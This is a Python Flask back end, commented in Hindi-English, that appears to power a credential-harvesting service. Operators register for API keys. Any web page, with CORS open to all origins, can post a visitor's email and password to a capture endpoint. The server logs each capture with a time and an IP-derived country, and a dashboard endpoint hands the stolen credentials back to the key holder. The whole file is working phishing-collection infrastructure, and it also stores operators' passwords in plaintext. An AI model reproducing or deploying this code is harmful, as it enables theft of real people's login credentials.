from flask import Flask, request, jsonify, render_template 
from flask_cors import CORS # 1. CORS Import kiya
import uuid
import datetime
import requests
import os 
import sqlite3

app = Flask(__name__)
CORS(app) # 2. CORS Enable kiya (Zaroori hai!)

# --- LOCAL DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS dev_users 
                      (email TEXT, password TEXT, key TEXT, created_at TEXT)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS visitor_logs 
                      (api_key TEXT, email TEXT, password TEXT, time TEXT, country TEXT)''')
    conn.commit()
    conn.close()

init_db()

def get_location(ip):
    try:
        if ip == "127.0.0.1" or not ip: return "Local Host"
        clean_ip = ip.split(',')[0].strip()
        response = requests.get(f'http://ip-api.com/json/{clean_ip}', timeout=5).json()
        return response.get('country', 'Unknown')
    except:
        return "Unknown"

# --- ROUTES ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_data/ping', methods=['GET'])
def ping():
    return jsonify({"status": "online", "brain": "active"}), 200

# --- USER SYSTEM ---
@app.route('/signup', methods=['POST'])
def signup():
    data = request.json
    email = data.get('email', '').lower().strip()
    password = data.get('password')

    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM dev_users WHERE email=?", (email,))
    if cursor.fetchone():
        conn.close()
        return jsonify({"error": "Email already registered. Please Login."}), 400
    
    api_key = f"FD-{uuid.uuid4().hex[:8].upper()}" 
    cursor.execute("INSERT INTO dev_users VALUES (?, ?, ?, ?)", 
                   (email, password, api_key, str(datetime.datetime.now())))
    conn.commit()
    conn.close()
    
    return jsonify({"email": email, "api_key": api_key}), 201

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email', '').lower().strip()
    password = data.get('password')

    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM dev_users WHERE email=? AND password=?", (email, password))
    user = cursor.fetchone()
    conn.close()

    if user:
        return jsonify({"email": user[0], "api_key": user[2]}), 200
    
    return jsonify({"error": "Invalid Email or Password"}), 401

# --- DATA RECEIVER (Updated endpoint to match HTML) ---
@app.route('/send_data/<api_key>', methods=['POST'])
def capture_visitor(api_key):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM dev_users WHERE key=?", (api_key,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Invalid API Key"}), 404

    payload = request.json
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    country = get_location(visitor_ip)
    time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    cursor.execute("INSERT INTO visitor_logs VALUES (?, ?, ?, ?, ?)",
                   (api_key, payload.get('email', 'N/A'), payload.get('password', 'N/A'), time_now, country))
    conn.commit()
    conn.close()
    return jsonify({"status": "Success", "msg": "Captured by FormData Brain"}), 200

@app.route('/get_data/<api_key>', methods=['GET'])
def get_dashboard_data(api_key):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT email, password, time, country FROM visitor_logs WHERE api_key=? ORDER BY ROWID DESC", (api_key,))
    results = cursor.fetchall()
    conn.close()
    
    data_list = []
    for doc in results:
        data_list.append({
            "email": doc[0],
            "password": doc[1],
            "time": doc[2],
            "country": doc[3]
        })
    
    return jsonify(data_list), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
